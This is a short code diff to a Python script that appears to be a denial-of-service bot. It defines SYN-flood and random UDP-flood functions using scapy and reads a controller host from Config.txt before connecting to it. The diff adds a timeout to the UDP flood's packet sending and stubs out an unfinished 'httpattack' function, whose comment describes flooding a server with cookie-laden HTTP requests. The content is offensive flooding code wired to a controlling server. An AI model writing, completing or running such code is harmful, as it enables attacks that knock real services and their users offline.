@@ -4,6 +4,8 @@ from scapy.all import *
 import random
 import nmap
 import string
+import requests
+import uuid
 
 def synflood(TARGET,TARGETPORT):
 	PACKETS_TO_SEND = 1000
@@ -32,7 +34,17 @@ def randombyteflooding(TARGET):
 
 		udppacket = UDP()
 
-		sr(ippacket/udppacket/generaterandomstring())
+		sr(ippacket/udppacket/generaterandomstring(),timeout=2)
+
+def httpattack():
+	"""
+	Once a bot establishes a connection to a VM server
+	As long as the connection remains active, it will send random HTTP GET or POST requests
+	These post requests consist of numerous cookies
+	"""
+
+	cookies = dict()
+	
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -43,6 +55,7 @@ with open("Config.txt", 'r') as file:
 	content = file.readlines()
 	lines = content[1]
 	HOST_SERVER = lines[13:]
+	HOST_SERVER = HOST_SERVER.rstrip()
 
 print('HOST_SERVER = ', HOST_SERVER)
 
